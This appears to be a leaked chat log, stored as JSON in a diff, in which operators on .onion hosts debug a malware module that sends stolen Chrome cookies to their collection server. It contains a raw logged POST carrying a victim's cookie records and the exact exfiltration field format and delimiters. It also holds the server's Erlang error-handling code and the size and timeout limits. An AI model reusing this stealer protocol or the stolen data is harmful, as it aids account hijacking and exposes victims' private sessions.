+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "200.58.180.138 -  [30/Aug/2021:17:31:45 +0300] \"POST /mor1/WIN-OQR8NN197GR_W639600.5B505F7FFC79B12CBB3622DF3CBB3B1C/84/ HTTP/1.1\" 403 182 \"\" \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Win64; x64\n; Trident/7.0; .NET4.0E; .NET4.0C; InfoPath.3; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729)\" \"-----------KRLRMIKEGVGXNTPQ\\r\\nContent-Disposition: form-data; name=\\\"data\\\"\\r\\n\\r\\nUtente2|Ch\nrome|dGFncy5hZHNhZmV0eS5uZXQ=|RElE|OTUxNTg3OGU0MjIzODM5YmQ4MjQxNzhjZTIwYTBjMDM=|1546590957|2147483641|Lw==\\r\\nUtente2|Chrome|dGFncy5hZHNhZmV0eS5uZXQ=|SURU|MTAw|1546590957|2147483641|Lw==\\r\\nUtente2|Chrom\ne|dGFncy5hZHNhZmV0eS5uZXQ=|VUlE|OTUxNTg3OGU0MjIzODM5YmQ4MjQxNzhjZTIwYTBjMDM=|1546590957|2147483641|Lw==\\r\\nUtente2|Chrome|LmFkc2FmZXR5Lm5ldA==|Y3RfZGlk|OTUxNTg3OGU0MjIzODM5YmQ4MjQxNzhjZTIwYTBjMDM=|154659\n0957|2147483641|Lw==\\r\\nUtente2|Chrome|LmFkc2FmZXR5Lm5ldA==|Y3RfaWR0|MTAw|1546590957|2147483641|Lw==\\r\\nUtente2|Chrome|LmFkc2FmZXR5Lm5ldA==|Y3RfdWlk|OTUxNTg3OGU0MjIzODM5YmQ4MjQxNzhjZTIwYTBjMDM=|154659095\n7|2147483641|Lw==\\r\\nUtente2|Chrome|dGFncy5hZHNhZmV0eS5uZXQ=|dg==|Mg==|1546590957|2147483641|Lw==\\r\\nUtente2|Chrome|Lmdvb2dsZS5jb20=|Q09OU0VOVA==|WUVTK0lULml0K1YxMg==|1550218723|2146723192|Lw==\\r\\nUtente\n2|Chrome|Lmdvb2dsZS5pdA==|Q09OU0VOVA==|WUVTK0lULml0K1YxMg==|1550218724|2146723192|Lw==\\r\\nUtente2|Chrome|LnlvdXR1YmUuY29t|Q09OU0VOVA==|WUVTK0lULml0K1YxMg==|1550218724|2146723192|Lw==\\r\\nUtente2|Chrome|Lm\nludGVudGlxLmNvbQ==|SVF2ZXI=|MS45|1562134121|1877494136|Lw==\\r\\nUtente2|Chrome|LmhvdGVscy5jb20=|X2Nsc192|MGE5ZTdlN2UtZGY1Mi00YWQzLWI0YjItY2UxZGI0MGQ1MWU5|1562134143|1719814143|Lw==\\r\\nUtente2|Chrome|LnRya\nXZhZ28uY29t|Y3RpZA==|SzRETTU1bm1JMzdIQzVudXZUTXBveFhROU4=|1562134117|2147483643|Lw==\\r\\nUtente2|Chrome|d3d3LnRyaXZhZ28uaXQ=|ZnR2|JTdCJTIyZnR2JTIyJTNBJTIyMjAxOTA3MDMwNjA4NDAlMjIlMkMlMjJsdHYlMjIlM0ElMjIyMD\nE5MDcwMzA2MDg0MCUyMiUyQyUyMmVwJTIyJTNBOTk5OSUyQyUyMmNudHYlMjIlM0ExJTJDJTIyY250YyUyMiUzQTElMkMlMjJjbnRjcyUyMiUzQTElMkMlMjJmZXAlMjIlM0E5OTk5JTJDJTIydmMlMjIlM0EwJTJDJTIyY3RsJTIyJTNBOTk5JTJDJTIyY3RmJTIyJTNBO\nTk5JTJDJTIyaXRlbSUyMiUzQTIzMTMxNjglMkMlMjJwYXRoJTIyJTNBNDU4MTclMkMlMjJwYXRoMiUyMiUzQW51bGwlN0Q=|1562134136|2147483644|Lw==\\r\\nUtente2|Chrome|Lnd3dy50cml2YWdvLml0|aW50ZW50X21lZGlhX3ByZWZz||1562134121|-210\n1681175|Lw==\\r\\nUtente2|Chrome|ZHVzLnRyaXZhZ28uY29t|c0xhbmd1YWdlTG9jYWxl|VUs=|1562134117|2147483643|Lw==\\r\\nUtente2|Chrome|c2VjZGUudHJpdmFnby5jb20=|c0xhbmd1YWdlTG9jYWxl|VUs=|1562134120|2147483643|Lw==\\r\\\nnUtente2|Chrome|LnRyaXZhZ28uY29t|dGlk|N2JXQjhlZzVSalZ1VUI2Rm1hOXFTMXZXSlQ=|1562134140|2147483643|Lw==\\r\\nUtente2|Chrome|LnRyaXZhZ28uaXQ=|dGlk|NGFBWHhYNldhaG5IWmhHRm1PVFRLNkpVYl8=|1562134117|2147483643|Lw\n==\\r\\nUtente2|Chrome|LnRyaXZhZ28uY29t|dHJ2X3RpZA==|N2JXQjhlZzVSalZ1VUI2Rm1hOXFTMXZXSlQ=|1562134140|2147483643|Lw==\\r\\nUtente2|Chrome|LnRyaXZhZ28uaXQ=|dHJ2X3RpZA==|NGFBWHhYNldhaG5IWmhHRm1PVFRLNkpVYl8=|156\n\n...\n..........."
+    },
+    "2021-08-30T14:33:11.250580": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "хооооотя код 403"
+    },
+    "2021-08-30T14:33:14.507450": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "почему"
+    },
+    "2021-08-30T14:33:57.057800": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "zulas: давай разбираться"
+    },
+    "2021-08-30T14:36:02.437819": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "POST /mor1/WIN-OQR8NN197GR_W639600.5B505F7FFC79B12CBB3622DF3CBB3B1C/84/ HTTP/1.1"
+    },
+    "2021-08-30T14:36:02.442014": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "POST /mor1/WIN-OQR8NN197GR_W639600.5B505F7FFC79B12CBB3622DF3CBB3B1C/84/ HTTP/1.1"
+    },
+    "2021-08-30T14:36:21.824761": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "это наш запрос, если не ошибаюсь это куки"
+    },
+    "2021-08-30T14:36:21.829456": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "это наш запрос, если не ошибаюсь это куки"
+    },
+    "2021-08-30T14:36:35.157097": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "zulas: поясни почему 403"
+    },
+    "2021-08-30T14:36:35.160082": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "zulas: поясни почему 403"
+    },
+    "2021-08-30T14:38:38.676369": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "buza: давай я тебе скину креды, может ты тоже посмотришь логи?"
+    },
+    "2021-08-30T14:38:38.680648": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "В конце данные обрезаны"
+    },
+    "2021-08-30T14:38:49.484650": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "просто чувствую что гл=де то рядом ответ"
+    },
+    "2021-08-30T14:38:54.994184": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Это так скопировалось?"
+    },
+    "2021-08-30T14:39:04.025581": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "driver: это я обрезал, там дохрена"
+    },
+    "2021-08-30T14:39:24.311111": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Ок"
+    },
+    "2021-08-30T14:39:40.409145": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "defender: в последний раз когда я этим занимался (еще будучи разработчиком того самого модуля который эти данные шлет), коды ошибки приходили от бэкенда в случае если ему данные не нравились"
+    },
+    "2021-08-30T14:39:40.411871": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "defender: в последний раз когда я этим занимался (еще будучи разработчиком того самого модуля который эти данные шлет), коды ошибки приходили от бэкенда в случае если ему данные не нравились"
+    },
+    "2021-08-30T14:40:13.904066": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "т.е. тут нужно указание от зуласа, начиная с какого смещения в этом запросе данные невалидны (по мнению парсящей их библиотеки)"
+    },
+    "2021-08-30T14:40:13.908095": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "т.е. тут нужно указание от зуласа, начиная с какого смещения в этом запросе данные невалидны (по мнению парсящей их библиотеки)"
+    },
+    "2021-08-30T14:41:26.284013": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "так да, но пока он думает, можетт у тебя мысли будут"
+    },
+    "2021-08-30T14:42:45.466686": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "403 Forbidden шлет во многих случаях .. самый общий это неверный URL .. потом всякие баны и т.п."
+    },
+    "2021-08-30T14:43:27.703389": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "у тебя есть конкретный сервер с конкретной базой и софтом + логи"
+    },
+    "2021-08-30T14:43:31.447183": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "рзберись плиз"
+    },
+    "2021-08-30T14:43:35.530250": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "для 84 команды конкретно тут может быть что он ожидает данные формы .. multipart но там ничего нет"
+    },
+    "2021-08-30T14:43:54.456637": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "я сваливаю сейчас . смогу только завтра . так что сорян"
+    },
+    "2021-08-30T14:44:08.987313": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "кто в жабе кодер модуля?"
+    },
+    "2021-08-30T14:44:21.704966": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "надо добавить его сюда"
+    },
+    "2021-08-30T14:44:40.865706": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "zulas: утром?"
+    },
+    "2021-08-30T14:45:04.425860": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ога"
+    },
+    "2021-08-30T14:45:04.868199": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "чтобы сюда кодера модуля подтянуть к этому времени"
+    },
+    "2021-08-30T14:46:32.017842": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "еще надо в лог писать длину пост данных .. потому что у меня лимит 64 кб"
+    },
+    "2021-08-30T14:46:43.415000": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "[19:43:23] <dgh> Там надо посмотреть весь лог, суть в том что должно быть по 8 полей \n[19:43:39] <dgh> И точно такую же ошибку нам выдавало когда их было больше или меньше \n[19:43:52] <dgh> И возвращало типа что то Missmatch parametr count \n[19:43:55] <dgh> В ответе"
+    },
+    "2021-08-30T14:46:48.424194": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "таймаут по чтению - 50 секунд"
+    },
+    "2021-08-30T14:46:58.654842": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Это еще можно проверить"
+    },
+    "2021-08-30T14:48:08.520291": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "да .. надо логировать ответ сервера .. там 403 может быть с пояснением"
+    },
+    "2021-08-30T14:48:52.503866": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "[ Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path ]\nтакие колонки должны быть"
+    },
+    "2021-08-30T14:50:31.729838": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "у меня может в глазах двоится .. но я насчитал в запросе 15 колонов в пост-дата"
+    },
+    "2021-08-30T14:50:37.210271": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "колонок"
+    },
+    "2021-08-30T14:50:57.650526": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Я по этому куску разбил по 8 везде"
+    },
+    "2021-08-30T14:51:05.433476": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Или ты полный лог глядишь"
+    },
+    "2021-08-30T14:51:06.972663": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "?"
+    },
+    "2021-08-30T14:51:14.894679": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "хотя нет .. 8 )"
+    },
+    "2021-08-30T14:51:36.060257": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "То что в лимит уперлось кстати вероятно."
+    },
+    "2021-08-30T14:51:39.707724": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "короче надо ответ сервера логировать . будет понятнее . .есть такая возможсность ? )"
+    },
+    "2021-08-30T14:51:39.739503": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Тоже"
+    },
+    "2021-08-30T14:51:51.345055": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "и размер запроса"
+    },
+    "2021-08-30T14:52:13.549245": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "свалил )"
+    },
+    "2021-08-30T14:54:50.403999": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "сейчас автор модуля должен зайти"
+    },
+    "2021-08-30T14:54:50.406730": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "сейчас автор модуля должен зайти"
+    },
+    "2021-08-31T08:20:34.373786": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ну и ?"
+    },
+    "2021-08-31T08:20:44.477178": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "одному мне больше всез надо ?"
+    },
+    "2021-08-31T08:21:25.222020": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "со вчера вечера что-то писали тут?"
+    },
+    "2021-08-31T08:21:25.223342": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "со вчера вечера что-то писали тут?"
+    },
+    "2021-08-31T08:23:54.165734": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "zulas: скинь еще раз кусок того POSTа, который был отвергнут бэком"
+    },
+    "2021-08-31T08:23:54.167365": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "zulas: скинь еще раз кусок того POSTа, который был отвергнут бэком"
+    },
+    "2021-08-31T08:24:17.353681": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "А тут истории нет?\nПисал по поводу новых полей в записи куки"
+    },
+    "2021-08-31T08:24:26.068492": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "нету истории"
+    },
+    "2021-08-31T08:24:26.069697": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "нету истории"
+    },
+    "2021-08-31T08:26:45.177754": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "ну так на чем остановились?"
+    },
+    "2021-08-31T08:26:45.179401": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ну так на чем остановились?"
+    },
+    "2021-08-31T08:27:19.301382": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "я остановился на этом: вот был POST, с виду нормальный, бэк на него 403 сказал. Я попросил зуласа сказать что в нем не так"
+    },
+    "2021-08-31T08:27:19.302779": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "я остановился на этом: вот был POST, с виду нормальный, бэк на него 403 сказал. Я попросил зуласа сказать что в нем не так"
+    },
+    "2021-08-31T08:27:38.956521": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "а я попросил расширить лог . чтобы логировало ответ"
+    },
+    "2021-08-31T08:27:51.221395": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "и размер запроса"
+    },
+    "2021-08-31T08:29:36.037979": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "а ты steller ?"
+    },
+    "2021-08-31T08:29:36.041557": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "а ты steller ?"
+    },
+    "2021-08-31T08:31:18.948820": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Писал по поводу новых полей в записи куки"
+    },
+    "2021-08-31T08:33:03.541030": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "что именно?"
+    },
+    "2021-08-31T08:33:03.541972": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "что именно?"
+    },
+    "2021-08-31T08:33:15.476311": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "403 встречалась раньше ошибка\n-----------CJLVIYOINTQPMYSU\nContent-Disposition: form-data; name=\"data\"\n\nuser|Chrome|.google.com|ANID|\tdjEw171ep2SDF+UMAcWRRWBcsbp5H34/V0frREuTTKAE2F3BXw3fVVHhgYgcKidlSSPxtTs32WPiqcV/p021G67RLpNXgRDrMqljrJ16Ml1Ckwz2a2URAQ==|1588241125|1651313125|/\nuser|Chrome|.register.com|__utma|\tdjEwnpzEp2a3+eOKByaEj0nLtLL7HGvIusWq1obAuia9wTCz3pPEUF6A+gFpZ3LHPf2GSueVelCwgrXMR96kV8MmLcClokQ=|1588241143|1651313173|/\n\n-----------CJLVIYOINTQPMYSU\nContent-Disposition: form-data; name=\"source\"\n\nChrome cookies\n-----------CJLVIYOINTQPMYSU--\n\n403\nMismatch parameters count!"
+    },
+    "2021-08-31T08:33:43.135763": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "zulas: сколько полей в куки у тебя сейчас?\nsteller: а у тебя?"
+    },
+    "2021-08-31T08:33:43.139683": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "zulas: сколько полей в куки у тебя сейчас?\nsteller: а у тебя?"
+    },
+    "2021-08-31T08:34:59.534227": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "[ Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path ]"
+    },
+    "2021-08-31T08:35:00.849091": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "вот поля"
+    },
+    "2021-08-31T08:35:14.270186": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "разделитель |"
+    },
+    "2021-08-31T08:35:28.665073": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Разработчик админки планирует добавить 2 поля secure, httponly в конец записи.\nСейчас:\nUsername, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path"
+    },
+    "2021-08-31T08:35:46.675734": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "разделители строк: [ <<10>>, <<13,10>>]"
+    },
+    "2021-08-31T08:37:31.165932": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "403 была, когда некоторые поля не кодировались в В64. В отстойнике они безусловно декодировались."
+    },
+    "2021-08-31T08:38:28.753098": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "А что по поводу максимального размера данных, он ограничен 64КБ будет?"
+    },
+    "2021-08-31T08:39:10.940777": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "{read_length, 64000},\n{read_timeout, 50000}\nя могу и больше сделать"
+    },
+    "2021-08-31T08:39:15.178535": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "таковы требоания были"
+    },
+    "2021-08-31T08:40:40.541531": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "50000 это в миллисекундах"
+    },
+    "2021-08-31T08:43:47.769105": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "В модуле нет такого ограничения. Можно разбить на несколько запросов, в принципе.\nА какие ошибки отстойник может отдавать? Их желательно как-то обрабатывать.\n403 добавил в обработку. На модуль приходили ещё 404 и 500. 500, видимо, от прокладки."
+    },
+    "2021-08-31T08:45:02.924223": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "при успешном приеме и добавлении в базу dero всегда выдает 200 и /1/ ?"
+    },
+    "2021-08-31T08:45:20.941683": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "403 ошибка формата данных?"
+    },
+    "2021-08-31T08:45:42.353766": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "просо 200 бывает без /1/ ?"
+    },
+    "2021-08-31T08:45:46.773141": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "просто"
+    },
+    "2021-08-31T08:46:17.064752": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "zulas:"
+    },
+    "2021-08-31T08:47:07.168892": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "зачем этот /1/ ?"
+    },
+    "2021-08-31T08:47:10.001467": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "reply(not_found, Req) ->\n { ok, Req1 } = cowboy_req:reply(404, [], <<\"Not found\">>, Req),\n Req1;\n\nreply(forbidden, Req) ->\n { ok, Req1 } = cowboy_req:reply(403, [], <<\"Forbidden\">>, Req),\n Req1;\n\nreply(missing_data, Req) ->\n { ok, Req1 } = cowboy_req:reply(403, [{<<\"Forbidden\">>, <<\"text/plain\">>}], <<\"Missing data field!\">>, Req),\n Req1;\n\nreply(missing_keys, Req) ->\n { ok, Req1 } = cowboy_req:reply(403, [{<<\"Forbidden\">>, <<\"text/plain\">>}], <<\"Missing keys field!\">>,  Req),\n Req1;\n\nreply(missing_parameters, Req) ->\n {ok,Req1} = cowboy_req:reply(403, [{<<\"Forbidden\">>, <<\"text/plain\">>}], <<\"Mismatch parameters count!\">>,  Req),\n Req1;\n\nreply(request_timeout, Req) ->\n {ok,Req1} = cowboy_req:reply(408, [{<<\"Request Timeout\">>, <<\"text/plain\">>}], <<\"Request Timeout\">>,  Req),\n Req1;"
+    },
+    "2021-08-31T08:47:16.136005": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "вот такие ошибки бывают"
+    },
+    "2021-08-31T08:47:22.018129": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "текст у вас отобразился ?"
+    },
+    "2021-08-31T08:47:31.376763": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "а то у меня пиджин -- и нифига"
+    },
+    "2021-08-31T08:47:40.875003": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "отразился"
+    },
+    "2021-08-31T08:48:11.905979": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "200 бывает без /1/ ?"
+    },
+    "2021-08-31T08:48:50.548215": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "по коду вроде не бывает"
+    },
+    "2021-08-31T08:48:57.440328": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "почуму спрашиваю - нужно ли в модуле проверять получение /1/ или достаточно получить статус 200 ?"
+    },
+    "2021-08-31T08:49:06.639192": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "[11:47:07] <hof> зачем этот /1/ ?\nтак по тз"
+    },
+    "2021-08-31T08:49:06.640633": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "[11:47:07] <hof> зачем этот /1/ ?\nтак по тз"
+    },
+    "2021-08-31T08:49:25.813522": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "это типа следующая команда для клиента"
+    },
+    "2021-08-31T08:49:29.557565": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "т.е. 200 без /1/ не бывает?"
+    },
+    "2021-08-31T08:49:55.932124": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "не бывает"
+    },
+    "2021-08-31T08:50:06.568416": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ок, отлично"
